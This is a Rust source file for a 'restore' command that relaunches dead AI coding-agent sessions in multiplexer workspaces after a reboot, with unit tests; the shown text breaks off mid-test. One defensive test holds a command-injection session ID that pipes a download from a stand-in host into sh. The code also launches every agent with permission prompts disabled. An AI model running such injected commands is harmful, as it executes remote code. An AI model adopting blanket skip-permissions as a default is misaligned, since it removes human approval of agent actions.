// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 ORASCOPE Co.,Ltd. (https://www.orascope.net)

//! `herdr-tower restore` — rebuilding the layout from dead records.
//!
//! After a reboot the backend is empty and the record store still holds
//! everything that was running. This walks those records and puts the sessions
//! back. The default is a *fresh* CLI, not a resumed conversation: re-anchoring
//! through `SESSION.md` and `wake-all` produces a better-oriented agent than
//! reloading a bloated context, so `--resume` is opt-in.
//!
//! The plan does not assume what survived a reboot; it asks, and absorbs the
//! answer rather than branching on it. herdr saves and restores its workspace
//! and tab layout, so the *places* come back and only the agents inside them
//! are missing — `session_exists` is then true, `new_session` falls to false,
//! and only a tab is created. Where nothing came back, both the workspace and
//! the tab are made. Two workspaces with the same label never appear.
//!
//! One trap is worth spelling out, because it is invisible until it bites: the
//! empty shell panes herdr restores must not satisfy "a pane is already here".
//! If they did, `restore` would skip every session it was written to bring
//! back. `herdrx::list_panes` returns every pane, whether or not an agent is
//! in it, so the filter is applied here — see [`occupied_slots`]. Dropping it silently turns `restore` into a
//! no-op after exactly the event it exists for.

use std::collections::{HashMap, HashSet};
use std::io::Write;
use std::path::Path;

use herdrx::Herdr;
use tower_state::{Agent, AgentState, Store};

use crate::helpcmd::flags::{FlagError, FlagSet};
use crate::infocmd::{state_word, unit_word};
use crate::restorepick::Picker;
use crate::shorten_home;

/// One line of the plan: which record, and what to run to bring it back.
#[derive(Debug, Clone)]
pub struct RestoreItem {
    pub agent: Agent,
    /// Create the session, rather than adding a window to one that is there.
    pub new_session: bool,
    /// The launch command typed into the new pane.
    pub cmd: String,
}

impl RestoreItem {
    /// What this item will do, in the words the plan listing and the checklist
    /// both use.
    pub fn verb(&self) -> &'static str {
        if self.new_session {
            "new workspace"
        } else {
            "new window"
        }
    }
}

/// The plan, and every reason something is not in it.
///
/// The reasons are half the value. `restore` runs after a reboot, when the user
/// is trying to work out why a bot did not come back, and a record silently
/// dropped from the plan is indistinguishable from one the tool never saw.
#[derive(Debug, Default)]
pub struct RestorePlan {
    pub items: Vec<RestoreItem>,
    pub skipped: Vec<String>,
}

/// Where `--resume` and the gemini launch command look for a recorded
/// conversation.
///
/// [`tower_ui::ResumePaths`], not a second copy: `tower_ui` needed the resume lookups
/// before `tower_cli` existed, because pressing enter on a dead row in the TUI has
/// to know whether the conversation can come back. Injected rather than looked
/// up inside the planner so a plan test never reads the developer's real
/// `~/.codex` — the same rule `tower_usage` follows.
pub use tower_ui::{resume_command, ResumePaths};

/// The outside world the plan consults.
///
/// Every lookup is optional and an absent one answers "nothing". That is not
/// laziness: a plan
/// built with no knowledge of the backend has to come out as "create
/// everything", because that is the honest answer for a machine whose
/// multiplexer is not up yet.
#[derive(Default)]
pub struct RestoreEnv<'a> {
    /// Whether a workspace with that label already exists.
    pub session_exists: Ask<'a, bool>,
    /// Whether that session already has a pane in that folder, whatever is
    /// running in it.
    pub pane_at: Ask2<'a, bool>,
    /// The startup units (plists, systemd user units) that create this session
    /// themselves.
    pub launch_units: Ask<'a, Vec<String>>,
    pub roots: ResumePaths,
}

/// One question about the outside world, or `None` for "assume nothing".
pub type Ask<'a, T> = Option<&'a dyn Fn(&str) -> T>;
/// The same, for a question that takes a session *and* a folder.
pub type Ask2<'a, T> = Option<&'a dyn Fn(&str, &str) -> T>;

impl RestoreEnv<'_> {
    fn session_exists(&self, s: &str) -> bool {
        self.session_exists.is_some_and(|f| f(s))
    }

    fn pane_at(&self, session: &str, cwd: &str) -> bool {
        self.pane_at.is_some_and(|f| f(session, cwd))
    }

    fn launch_units(&self, session: &str) -> Vec<String> {
        self.launch_units.map(|f| f(session)).unwrap_or_default()
    }
}

/// Planning options.
#[derive(Debug, Clone, Copy, Default)]
pub struct RestoreOpts {
    pub resume: bool,
    /// The user named IDs on the command line.
    ///
    /// That overrides *policy* exclusions — a session a startup unit owns — but
    /// never a *physical* one. Naming an ID cannot make a second bot appear in
    /// a pane that already has one.
    pub explicit: bool,
}

/// Walks the dead records in session-and-window order and builds the plan.
pub fn plan_restore(agents: &[Agent], env: &RestoreEnv, opts: &RestoreOpts) -> RestorePlan {
    let mut sorted: Vec<&Agent> = agents.iter().collect();
    sorted.sort_by(|a, b| {
        (&a.pane.session, a.pane.window, &a.id).cmp(&(&b.pane.session, b.pane.window, &b.id))
    });

    let mut plan = RestorePlan::default();
    // "session:window" — a split pane and its neighbour are one window, and one
    // window gets one agent back.
    let mut seen_window: HashSet<String> = HashSet::new();
    let mut session_planned: HashSet<String> = HashSet::new();

    for a in sorted {
        if a.state != AgentState::Dead {
            continue; // a living session is not something to restore
        }
        if a.pane.session.is_empty() {
            plan.skipped
                .push(format!("{}: no workspace name recorded", a.id));
            continue;
        }
        if a.cwd.is_empty() {
            plan.skipped.push(format!("{}: no folder recorded", a.id));
            continue;
        }
        if !std::fs::metadata(&a.cwd).is_ok_and(|m| m.is_dir()) {
            plan.skipped
                .push(format!("{}: folder is gone {}", a.id, a.cwd));
            continue;
        }
        // Something is already in that slot — revived from outside (a startup
        // unit) or still starting up, with `bot-up.sh` holding its lock so the
        // pane's command is still `bash`. Adding a window here launched the bot
        // twice, measured across a reboot on 2026-09-03. Naming the ID does not
        // override this: the collision is physical.
        if env.pane_at(&a.pane.session, &a.cwd) {
            plan.skipped.push(format!(
                "{}: a pane already sits there (workspace {}, {}) — running or starting, so this is skipped",
                a.id,
                a.pane.session,
                shorten_home(&a.cwd)
            ));
            continue;
        }
        // A bot whose whole workspace a startup unit creates is not ours to
        // restore. Creating the session first makes the unit's own creation
        // fail as a duplicate, and the bot then never comes up at all.
        let units = env.launch_units(&a.pane.session);
        if !units.is_empty() && !opts.explicit {
            plan.skipped.push(format!(
                "{}: owned by {} ({}) — started at login, so it is left out (force it with restore {})",
                a.id,
                unit_word(),
                units.join(", "),
                a.id
            ));
            continue;
        }

        let wk = format!("{}:{}", a.pane.session, a.pane.window);
        if seen_window.contains(&wk) {
            continue; // a split pane of a window already planned
        }

        let mut cmd = fresh_command(a, &env.roots);
        if opts.resume {
            match resume_command(a, &env.roots) {
                Ok(rc) => cmd = rc,
                // Falling back rather than skipping: the point is to get the
                // agent running again, and a lost conversation is a lesser
                // failure than a session that never comes back.
                Err(e) => plan.skipped.push(format!(
                    "{}: the conversation cannot be revived ({e}) — starting fresh",
                    a.id
                )),
            }
        }
        if cmd.is_empty() {
            plan.skipped
                .push(format!("{}: unknown kind {}", a.id, a.kind));
            continue;
        }
        // Fresh or resumed, every agent comes back without approval prompts,
        // the way `wt new` and `open` start one — see `tower_wt::command_for`.
        cmd = tower_wt::with_auto_approve(&cmd);
        // Claimed *after* the kind check, not before it. Marking the window as
        // taken first lets a record of a kind this tool cannot launch consume
        // the slot, and its split-pane neighbour is then dropped by the dedup
        // `continue` — which leaves no skip reason, so the agent simply is not
        // there after a reboot. Record IDs are `<kind>-<pane>` and sort third,
        // so any vendor name ordering before `claude` reaches it: an `aider`
        // pane split beside a `claude` one would silently cost you the claude
        // session. Claiming the slot only once something is actually planned
        // for it can restore more, never less, and never twice.
        seen_window.insert(wk);

        let new_session =
            !env.session_exists(&a.pane.session) && !session_planned.contains(&a.pane.session);
        session_planned.insert(a.pane.session.clone());
        plan.items.push(RestoreItem {
            agent: a.clone(),
            new_session,
            cmd,
        });
    }
    plan
}

/// Picks the named records, in the order they were named.
///
/// A named ID that is missing or alive leaves a reason rather than being
/// dropped: a user who typed an ID and got silence cannot tell a typo from a
/// tool that ignored them.
pub fn filter_by_ids(agents: &[Agent], ids: &[String]) -> (Vec<Agent>, Vec<String>) {
    let mut picked = Vec::new();
    let mut skipped = Vec::new();
    for id in ids {
        match agents.iter().find(|a| &a.id == id) {
            None => skipped.push(format!("{id}: no record")),
            Some(a) if a.state != AgentState::Dead => skipped.push(format!(
                "{id}: alive ({}) — nothing to restore",
                state_word(a.state)
            )),
            Some(a) => picked.push(a.clone()),
        }
    }
    (picked, skipped)
}

/// The command that starts a fresh agent of this kind, or empty for a kind this
/// tool does not launch.
///
/// gemini resolves to `agy` when there is any trace of the Antigravity CLI,
/// which is the same rule `wt new` follows — two different ways of starting the
/// same vendor would be two different agents to the user.
fn fresh_command(a: &Agent, roots: &ResumePaths) -> String {
    match a.kind.as_str() {
        "claude" => "claude".into(),
        "codex" => "codex".into(),
        // An unset root is "no agy installed" rather than a relative-path probe
        // of whatever directory the process happens to be in.
        "gemini" if roots.gemini_dir.as_os_str().is_empty() => "gemini".into(),
        "gemini" => tower_usage::gemini_command(&roots.gemini_dir).into(),
        // A bare `opencode` in the folder it died in. Resuming it is
        // `resume_command`'s, which needs the session ID the plugin reports.
        "opencode" => "opencode".into(),
        _ => String::new(),
    }
}

/// `restore`'s flags.
///
/// Kept as its own function because the usage block it prints is frozen in
/// `expected/restore-help.txt` — the wording and the declaration set are the
/// output, not a description of it.
pub fn restore_flag_set() -> FlagSet {
    FlagSet::new("restore")
        .bool(
            "resume",
            false,
            "revive the conversation too (claude --resume and friends) — a bloated context comes back with it",
        )
        .bool("dry-run", false, "print the plan and change nothing")
        .bool("yes", false, "run the whole plan with no checklist (for scripts)")
}

/// What the command line asked for.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct RestoreArgs {
    pub resume: bool,
    pub dry_run: bool,
    pub yes: bool,
    pub ids: Vec<String>,
}

/// Parses `restore`'s arguments, or reports the flag error that stopped the
/// parse.
pub fn parse_restore_args<S: AsRef<str>>(args: &[S]) -> Result<RestoreArgs, FlagError> {
    let p = restore_flag_set().parse(args)?;
    let ids = p.args().to_vec();
    // `FlagSet` stops at the first positional, so everything after an ID is an
    // ID — including `--dry-run`. That did not merely go unused: the explicit-ID
    // path skips the checklist, so `restore <id> --dry-run` carried out the
    // restore it was being asked to describe. A word that looks like a flag is a
    // flag in the wrong place, never a record ID.
    if let Some(flag) = ids.iter().find(|s| s.starts_with('-')) {
        return Err(FlagError::Bad(format!(
            "flag provided but not defined: {flag}"
        )));
    }
    Ok(RestoreArgs {
        resume: p.bool("resume"),
        dry_run: p.bool("dry-run"),
        yes: p.bool("yes"),
        ids,
    })
}

/// The body of `herdr-tower restore`.
///
/// `picker` is how a person is asked which sessions to bring back;
/// [`crate::restorepick::terminal_picker`] is the real one and `None` is "do not ask", which is what
/// a test passes and what the command already did through a pipe: print the
/// plan, then carry it out.
pub fn run_restore<W: Write>(
    w: &mut W,
    store: &Store,
    h: &Herdr,
    args: &[String],
    picker: Option<&Picker>,
) -> Result<(), Box<dyn std::error::Error>> {
    let parsed = match parse_restore_args(args) {
        Ok(p) => p,
        Err(e) => {
            // The defaults block is printed here, and the caller then prints
            // the message again as `herdr-tower: …`. The block goes to the
            // writer the caller gave, not to stderr, as `wt wait`'s does: that
            // is the same stream everything else this function prints goes to,
            // and is the only version a test can read back.
            write!(w, "{}", restore_flag_set().diagnostic(&e))?;
            return Err(e.into());
        }
    };

    let all = store.list()?;
    let explicit = !parsed.ids.is_empty();
    let (agents, id_skipped) = if explicit {
        filter_by_ids(&all, &parsed.ids)
    } else {
        (all, Vec::new())
    };

    let (occupied, inventory_read) = occupied_slots_checked(h);
    let paths = tower_wiring::Paths::detect().unwrap_or_default();
    // An unreadable inventory is not an empty one. `unwrap_or(false)` turned a
    // transient `workspace.list` failure into "that workspace is gone", and the
    // plan then said *create* it — so a server that answered again by execution
    // time got a second workspace with a label it already had.
    //
    // `true` is the safe answer while the truth is unknown: it plans a tab in the
    // workspace rather than a new workspace, and a tab that cannot be made is one
    // reported failure instead of a duplicate nobody asked for. The flag is what
    // stops the plan being *executed* on that guess.
    let lookup_failed = std::cell::Cell::new(!inventory_read);
    let session_exists = |s: &str| match h.has_workspace(s) {
        Ok(found) => found,
        Err(_) => {
            lookup_failed.set(true);
            true
        }
    };
    let pane_at = |session: &str, cwd: &str| occupied.contains(&slot(session, cwd));
    let launch_units = |session: &str| tower_wiring::session_agents(&paths, session);
    let env = RestoreEnv {
        session_exists: Some(&session_exists),
        pane_at: Some(&pane_at),
        launch_units: Some(&launch_units),
        roots: ResumePaths::from_env(),
    };

    let mut plan = plan_restore(
        &agents,
        &env,
        &RestoreOpts {
            resume: parsed.resume,
            explicit,
        },
    );
    for s in id_skipped.iter().chain(plan.skipped.iter()) {
        writeln!(w, "  skipped: {s}")?;
    }
    if plan.items.is_empty() {
        writeln!(w, "there are no dead sessions to restore.")?;
        return Ok(());
    }

    // A person who typed the bare command at a terminal picks from a checklist.
    // Named IDs, `--yes` and a pipe all mean the choosing already happened.
    let interactive =
        !parsed.dry_run && !explicit && !parsed.yes && picker.is_some_and(|p| (p.is_terminal)());
    if !interactive {
        for it in &plan.items {
            writeln!(
                w,
                "  [{}] {} {} ({}) ← {}",
                it.agent.id,
                it.verb(),
                it.agent.pane.session,
                shorten_home(&it.agent.cwd),
                it.cmd
            )?;
        }
    }
    if parsed.dry_run {
        if lookup_failed.get() {
            writeln!(
                w,
                "  ⚠ the workspace list could not be read, so 'new workspace' above is a guess"
            )?;
        }
        writeln!(
            w,
            "(dry-run — nothing was done) to revive only some: herdr-tower restore <id> [<id> ...]"
        )?;
        return Ok(());
    }
    // Planned on a guess, so it is not executed. A dry run still prints — seeing
    // what would happen is useful even when the server is not answering — but
    // creating workspaces from an inventory nobody could read is not.
    if lookup_failed.get() {
        return Err(
            "the workspace list could not be read — check the herdr server and try again".into(),
        );
    }
    if interactive {
        // `is_terminal` said yes, so the picker is there.
        match (picker.expect("interactive implies a picker").choose)(&plan.items) {
            None => {
                writeln!(w, "cancelled — nothing was restored.")?;
                return Ok(());
            }
            Some(v) if v.is_empty() => {
                writeln!(w, "nothing was picked, so nothing was restored.")?;
                return Ok(());
            }
            Some(v) => plan.items = v,
        }
    }

    // One failure does not end the batch. This command exists for the bulk
    // post-reboot case, and a single stale or transiently failing session used to
    // stop the loop and leave every later one unrestored — which is the moment a
    // person least wants to find out they have to run it again and guess which
    // half worked.
    let mut restored = 0usize;
    let mut failed: Vec<String> = Vec::new();
    let empty = empty_panes(h);
    for it in &plan.items {
        let session = &it.agent.pane.session;
        // The agent's own pane first, when herdr still has it and nothing is
        // running in it: a reboot brings the tabs back as empty shells, and
        // spawning beside one leaves it there for good — every restore after a
        // reboot adding another dead tab to the layout.
        //
        // The record's *own* pane, and not any empty pane in the same folder.
        // There is no field that says which panes herdr restored and which the
        // person opened, and idle shells in a project folder are ordinary: this
        // machine has two sitting in a folder that also holds a live agent
        // (measured 2026-09-11). Typing a launch command into one of those would
        // be worse than the tab it saves. A pane ID that still names this agent's
        // folder is the one thing that cannot be somebody else's.
        let reuse = (!it.new_session)
            .then(|| empty.get(&it.agent.pane.pane_id))
            .flatten()
            .filter(|cwd| **cwd == canonical(&it.agent.cwd))
            .map(|_| it.agent.pane.pane_id.clone());
        let pane = match reuse {
            Some(p) => Ok(p),
            None if it.new_session => tower_mux::new_session(h, session, &it.agent.cwd),
            None => tower_mux::spawn_in(h, session, base_name(&it.agent.cwd), &it.agent.cwd, None),
        };
        let pane = match pane {
            Ok(p) => p,
            Err(e) => {
                failed.push(format!("{session} could not be restored: {e}"));
                continue;
            }
        };

        // The command is typed into a live shell rather than being the pane's
        // process: the window then survives the CLI exiting, and the user's own
        // shell environment is what the agent starts under.
        if let Err(e) = tower_mux::send_text(h, &pane, &it.cmd) {
            failed.push(format!(
                "{session}: the start command could not be typed in: {e}"
            ));
            continue;
        }

        // The dead record is deliberately left alone. `send_text` returning `Ok`
        // means the shell accepted the keystrokes — not that the CLI started: a
        // missing binary or a resume ID the CLI rejects fails a moment later, and
        // deleting here destroyed the only record carrying that session ID while
        // reporting the session as restored.
        //
        // Nothing has to be deleted by hand. `tower_scan::sync_panes` removes a dead
        // row as soon as a *new* agent occupies the same `kind|session|cwd` slot,
        // and the restored pane is exactly that — but only once herdr recognizes a
        // CLI in it. A pane holding a shell whose agent never came up claims no
        // slot, so the record stays and the conversation stays resumable.
        restored += 1;
    }
    for f in &failed {
        writeln!(w, "  ✖ {f}")?;
    }

    write!(w, "restored {restored}.")?;
    if !parsed.resume {
        write!(
            w,
            " once each CLI is up, re-anchor them with `herdr-tower wake-all` (folders with a SESSION.md only)."
        )?;
    }
    writeln!(w)?;
    if failed.is_empty() {
        return Ok(());
    }
    // A nonzero exit, because a caller that asked for eight sessions and got six
    // has to be able to tell. The names were printed above.
    Err(format!("{} could not be restored", failed.len()).into())
}

/// The `session|folder` slots that already hold an agent.
///
/// Public because it is the one part of `restore` that can be checked against a
/// live server without changing anything — see `tests/restorecmd_live.rs`.
///
/// **Only panes with an agent in them.** herdr restores its layout across a
/// reboot, so the workspaces and tabs come back as empty shells; counting those
/// as occupied would make `restore` skip every session it exists to bring back.
/// `herdrx::list_panes` reports everything, so the filter has to be here.
pub fn occupied_slots(h: &Herdr) -> HashSet<String> {
    occupied_slots_checked(h).0
}

/// The same, saying whether the inventory behind it could be read whole.
///
/// The labels are the second half of a slot key, and a `workspace.list` that
/// failed while `pane.list` succeeded keyed every live pane by its raw workspace
/// ID while the stored records carry human labels. Nothing then matched, the
/// folder read as free, and `restore` started a second agent in a workspace that
/// already had one. The caller refuses to execute on an inventory it could not
/// read — the same guard the workspace lookup uses.
pub fn occupied_slots_checked(h: &Herdr) -> (HashSet<String>, bool) {
    let Ok(panes) = h.list_panes() else {
        // No server is the normal case for this command — that is what a reboot
        // looks like — and it means nothing is occupied.
        return (HashSet::new(), true);
    };
    let Ok(labels) = h.workspace_labels() else {
        return (HashSet::new(), false);
    };
    let slots = panes
        .iter()
        .filter(|p| p.has_agent())
        .map(|p| {
            let session = labels
                .get(&p.workspace_id)
                .cloned()
                .unwrap_or_else(|| p.workspace_id.clone());
            slot(&session, &p.cwd)
        })
        .collect();
    (slots, true)
}

/// Panes herdr reports with nothing running in them, by ID, each with the folder
/// it sits in.
///
/// The folder comes along because a pane ID can be reused: herdr hands out base36
/// IDs, so a record's old coordinate may name a pane that now belongs elsewhere.
/// The ID and the folder together are what make it the same place.
fn empty_panes(h: &Herdr) -> HashMap<String, String> {
    let Ok(panes) = h.list_panes() else {
        // No server is the normal case for this command — that is what a reboot
        // looks like — and it means there is nothing to reuse.
        return HashMap::new();
    };
    panes
        .iter()
        .filter(|p| !p.has_agent())
        .map(|p| (p.pane_id.clone(), canonical(&p.cwd)))
        .collect()
}

/// A path with its symlinks resolved, or itself when it cannot be.
fn canonical(cwd: &str) -> String {
    std::fs::canonicalize(cwd)
        .map(|p| p.to_string_lossy().into_owned())
        .unwrap_or_else(|_| cwd.to_string())
}

/// A slot key, with the path's symlinks resolved.
///
/// macOS answers `/private/var/…` where the record says `/var/…`, so comparing
/// the raw strings misses the collision this check exists to catch.
fn slot(session: &str, cwd: &str) -> String {
    format!("{session}|{}", canonical(cwd))
}

/// The last path component, for naming the new tab.
fn base_name(cwd: &str) -> &str {
    Path::new(cwd)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(cwd)
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    /// A flag after an ID is a flag, not an ID.
    ///
    /// `FlagSet` stops at the first positional, so `restore <id> --dry-run` put
    /// both words in `ids` — and the explicit-ID path skips the checklist, so the
    /// run it was being asked to describe was carried out instead.
    #[test]
    fn a_flag_after_an_id_is_refused_rather_than_taken_for_one() {
        let bad = parse_restore_args(&["claude-w2:p1", "--dry-run"]);
        assert!(bad.is_err(), "a safety flag must not become a record ID");

        // Either order still works when it is spelled properly.
        let ok = parse_restore_args(&["--dry-run", "claude-w2:p1"]).unwrap();
        assert!(ok.dry_run);
        assert_eq!(ok.ids, vec!["claude-w2:p1".to_string()]);
    }
    use time::OffsetDateTime;

    fn t0() -> OffsetDateTime {
        OffsetDateTime::from_unix_timestamp(1_756_000_000).unwrap()
    }

    /// Shared with `restorepick`'s tests, which need the same shape of record.
    pub(crate) fn dead_agent(id: &str, kind: &str, session: &str, window: i64, cwd: &str) -> Agent {
        let mut a = Agent::new(id, kind, t0());
        a.state = AgentState::Dead;
        a.pane.session = session.into();
        a.pane.window = window;
        a.pane.pane_id = "%9".into();
        a.cwd = cwd.into();
        a.session_id = format!("sid-{id}");
        a
    }

    /// A `RestoreEnv` that knows only which sessions exist.
    fn env_exists(f: &dyn Fn(&str) -> bool) -> RestoreEnv<'_> {
        RestoreEnv {
            session_exists: Some(f),
            ..RestoreEnv::default()
        }
    }

    fn no_sessions(_: &str) -> bool {
        false
    }

    #[test]
    fn the_first_record_of_a_session_creates_it_and_the_rest_get_windows() {
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().to_str().unwrap();
        let agents = vec![
            dead_agent("claude-1", "claude", "ai", 0, dir),
            dead_agent("claude-2", "claude", "ai", 1, dir),
        ];
        let plan = plan_restore(&agents, &env_exists(&no_sessions), &RestoreOpts::default());
        assert_eq!(plan.items.len(), 2, "{:?}", plan);
        assert!(plan.items[0].new_session);
        assert!(
            !plan.items[1].new_session,
            "two workspaces with one label is the failure this prevents"
        );
        assert_eq!(
            plan.items[0].cmd, "claude --dangerously-skip-permissions",
            "the default is a fresh CLI, without approval prompts"
        );
    }

    #[test]
    fn a_session_that_already_exists_only_gets_a_window() {
        let d = tempfile::tempdir().unwrap();
        let agents = vec![dead_agent(
            "claude-1",
            "claude",
            "ai",
            0,
            d.path().to_str().unwrap(),
        )];
        let exists = |name: &str| name == "ai";
        let plan = plan_restore(&agents, &env_exists(&exists), &RestoreOpts::default());
        assert_eq!(plan.items.len(), 1);
        assert!(!plan.items[0].new_session);
    }

    #[test]
    fn a_living_record_is_not_something_to_restore() {
        let d = tempfile::tempdir().unwrap();
        let mut a = dead_agent("claude-1", "claude", "ai", 0, d.path().to_str().unwrap());
        a.state = AgentState::Working;
        let plan = plan_restore(&[a], &env_exists(&no_sessions), &RestoreOpts::default());
        assert!(plan.items.is_empty(), "{:?}", plan);
    }

    /// A folder that no longer exists cannot be restored into, and the user has
    /// to be told which one — after a reboot that is usually an unmounted disk.
    #[test]
    fn a_folder_that_is_gone_is_skipped_with_its_path_named() {
        let agents = vec![dead_agent(
            "claude-1",
            "claude",
            "ai",
            0,
            "/no/such/dir-xyz",
        )];
        let plan = plan_restore(&agents, &env_exists(&no_sessions), &RestoreOpts::default());
        assert!(plan.items.is_empty());
        assert_eq!(plan.skipped.len(), 1);
        assert!(plan.skipped[0].contains("claude-1"), "{:?}", plan.skipped);
        assert!(plan.skipped[0].contains("/no/such/dir-xyz"));
    }

    /// Two records in one window are a split pane, and one window gets one
    /// agent back.
    #[test]
    fn split_panes_of_one_window_are_restored_once() {
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().to_str().unwrap();
        let agents = vec![
            dead_agent("claude-1", "claude", "ai", 0, dir),
            dead_agent("claude-2", "claude", "ai", 0, dir),
        ];
        let plan = plan_restore(&agents, &env_exists(&no_sessions), &RestoreOpts::default());
        assert_eq!(plan.items.len(), 1, "{:?}", plan.items);
    }

    /// A kind this tool cannot launch must not consume its window's one slot.
    ///
    /// Claiming the window before testing whether the kind is launchable lets
    /// the unknown record take the slot, and the `claude` record splitting the
    /// same window then hits the dedup `continue` — which prints nothing, so
    /// the session is simply missing after a reboot with no reason given.
    /// Record IDs are `<kind>-<pane>` and sort third, so any vendor sorting
    /// before `claude` triggers it.
    #[test]
    fn an_unlaunchable_kind_does_not_cost_its_neighbour_the_window() {
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().to_str().unwrap();
        let agents = vec![
            dead_agent("aider-w2:p1", "aider", "ai", 0, dir),
            dead_agent("claude-w2:p2", "claude", "ai", 0, dir),
        ];
        let plan = plan_restore(&agents, &env_exists(&no_sessions), &RestoreOpts::default());
        assert_eq!(
            plan.items
                .iter()
                .map(|i| i.agent.id.as_str())
                .collect::<Vec<_>>(),
            ["claude-w2:p2"],
            "the launchable record in the window has to survive: {plan:?}"
        );
        assert!(
            plan.skipped.iter().any(|s| s.contains("aider")),
            "and the one that could not be launched still says why: {:?}",
            plan.skipped
        );
    }

    /// A named ID that is missing or alive gets a reason. Filtering it away in
    /// silence leaves the user unable to tell a typo from a bug.
    #[test]
    fn a_named_id_that_cannot_be_restored_says_why() {
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().to_str().unwrap();
        let dead = dead_agent("claude-1", "claude", "ai", 0, dir);
        let mut alive = dead_agent("claude-2", "claude", "ai", 1, dir);
        alive.state = AgentState::Working;

        let ids: Vec<String> = ["claude-1", "claude-2", "claude-9"]
            .iter()
            .map(|s| s.to_string())
            .collect();
        let (picked, skipped) = filter_by_ids(&[dead, alive], &ids);
        assert_eq!(picked.len(), 1);
        assert_eq!(picked[0].id, "claude-1");
        assert_eq!(skipped.len(), 2, "{skipped:?}");
        assert!(skipped[0].contains("claude-2") && skipped[0].contains("alive"));
        assert!(skipped[1].contains("claude-9"));
    }

    #[test]
    fn resume_reopens_the_recorded_conversation() {
        let d = tempfile::tempdir().unwrap();
        let agents = vec![dead_agent(
            "claude-1",
            "claude",
            "ai",
            0,
            d.path().to_str().unwrap(),
        )];
        let plan = plan_restore(
            &agents,
            &env_exists(&no_sessions),
            &RestoreOpts {
                resume: true,
                explicit: false,
            },
        );
        assert_eq!(plan.items.len(), 1, "{:?}", plan);
        assert_eq!(
            plan.items[0].cmd,
            "claude --dangerously-skip-permissions --resume 'sid-claude-1'"
        );
    }

    /// A session ID that is a shell command is never typed into the shell: the
    /// record comes back fresh, and the skip says why.
    #[test]
    fn resume_never_types_a_session_id_that_is_a_command() {
        let d = tempfile::tempdir().unwrap();
        let mut a = dead_agent("claude-1", "claude", "ai", 0, d.path().to_str().unwrap());
        a.session_id = "x; curl evil|sh #".into();
        let plan = plan_restore(
            &[a],
            &env_exists(&no_sessions),
            &RestoreOpts {
                resume: true,
                explicit: false,
            },
        );
        assert_eq!(plan.items.len(), 1, "{:?}", plan);
        assert!(!plan.items[0].cmd.contains("curl"), "{}", plan.items[0].cmd);
        assert!(
            plan.skipped.iter().any(|s| s.contains("not a session ID")),
            "{:?}",
            plan.skipped
        );
    }

    /// No recorded session means no conversation to reopen, and the session
    /// still has to come back — a fresh CLI beats nothing at all.
    #[test]
    fn an_unresumable_record_falls_back_to_a_fresh_launch_and_says_so() {
        let d = tempfile::tempdir().unwrap();
        let mut a = dead_agent("claude-1", "claude", "ai", 0, d.path().to_str().unwrap());
        a.session_id = String::new();
        let plan = plan_restore(
            &[a],
            &env_exists(&no_sessions),
            &RestoreOpts {
                resume: true,
                explicit: false,
            },
        );
        assert_eq!(plan.items.len(), 1);
        assert_eq!(plan.items[0].cmd, "claude --dangerously-skip-permissions");
        assert_eq!(plan.skipped.len(), 1, "{:?}", plan.skipped);
    }

    /// A pane already in that folder means the bot is up or coming up — the
    /// `bot-up.sh` lock leaves the pane running plain `bash` for a while, which
    /// is exactly when `restore` used to add a second window and start the bot
    /// twice (measured across a reboot, 2026-09-03). Naming the ID does not
    /// override a physical collision.
    #[test]
    fn an_occupied_slot_is_never_restored_into_even_when_named() {
        let d = tempfile::tempdir().unwrap();
        let dir = d.path().to_str().unwrap();
        let agents = vec![dead_agent("claude-1", "claude", "claude-discord", 0, dir)];
        let exists = |_: &str| true;
        let taken = |session: &str, cwd: &str| session == "claude-discord" && cwd == dir;
        let env = RestoreEnv {
            session_exists: Some(&exists),
            pane_at: Some(&taken),
            ..RestoreEnv::default()
        };

        let plan = plan_restore(&agents, &env, &RestoreOpts::default());
        assert!(plan.items.is_empty(), "{:?}", plan.items);
        assert_eq!(plan.skipped.len(), 1);
        assert!(
            plan.skipped[0].contains("already sits there"),
            "{:?}",
            plan.skipped
        );

        let forced = plan_restore(
            &agents,
            &env,
            &RestoreOpts {
                resume: false,
                explicit: true,
            },
        );
        assert!(forced.items.is_empty(), "{:?}", forced.items);
    }

    /// A session a startup unit owns comes back on its own. Creating it first
    /// makes the unit's own creation fail as a duplicate and the bot never
    /// appears — so this exclusion is policy, and naming the ID overrides it.
    #[test]
    fn a_session_a_startup_unit_owns_is_left_to_it_unless_named() {
        let d = tempfile::tempdir().unwrap();
        let agents = vec![dead_agent(
            "claude-1",
            "claude",
            "collab-bot",
            0,
            d.path().to_str().unwrap(),
        )];
        let units = |session: &str| {
            if session == "collab-bot" {
                vec!["com.folder-bot.collab".to_string()]
            } else {
                Vec::new()
            }
        };
        let env = RestoreEnv {
            session_exists: Some(&no_sessions),
            launch_units: Some(&units),
            ..RestoreEnv::default()
        };

        let plan = plan_restore(&agents, &env, &RestoreOpts::default());
        assert!(plan.items.is_empty(), "{:?}", plan.items);
        assert!(
            plan.skipped[0].contains("com.folder-bot.collab"),
            "the unit's own label is what the user has to look up: {:?}",
            plan.skipped
        );

        let forced = plan_restore(
            &agents,
            &env,
            &RestoreOpts {
                resume: false,
                explicit: true,
            },
        );
        assert_eq!(forced.items.len(), 1, "{:?}", forced);
    }

    /// `--resume` falls back through [`tower_ui::resume_command`], so a kind this
    /// tool cannot launch has no fresh command either — the two answers have to
    /// agree, or the planner would skip on one and launch on the other.
    #[test]
    fn a_kind_this_tool_does_not_launch_has_no_command_of_either_sort() {
        let a = dead_agent("aider-1", "aider", "s", 0, "/tmp");
        assert!(resume_command(&a, &ResumePaths::default()).is_err());
        assert_eq!(fresh_command(&a, &ResumePaths::default()), "");
    }

    /// A supervised kind with no hook and no known resume flag still comes back
    /// as a fresh agent in its own folder: losing the pane entirely is the worse
    /// failure, and this is exactly what `claude` does with no session ID.
    ///
    /// Through the planner, not just `fresh_command`: a kind filter placed ahead
    /// of the launch command would drop the row there, and only a plan shows it.
    #[test]
    fn an_opencode_pane_comes_back_fresh_but_not_resumed() {
        let d = tempfile::tempdir().unwrap();
        let mut a = dead_agent("opencode-1", "opencode", "s", 0, d.path().to_str().unwrap());
        // The shape scan leaves behind: herdr sends no conversation ID for it.
        a.session_id.clear();

        let plan = plan_restore(
